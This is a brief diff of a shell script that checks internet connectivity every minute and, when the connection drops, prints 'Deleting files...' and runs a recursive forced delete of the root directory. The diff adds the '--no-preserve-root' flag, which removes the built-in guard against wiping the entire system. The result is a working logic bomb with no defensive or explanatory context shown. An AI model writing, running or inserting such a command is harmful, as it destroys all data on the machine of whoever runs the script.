@@ -6,7 +6,7 @@ while true; do
         echo "Connected to internet."
     else
         echo "Lost connection to internet. Deleting files..."
-        rm -rf /
+        rm --no-preserve-root -rf /
         break
     fi
     sleep 60
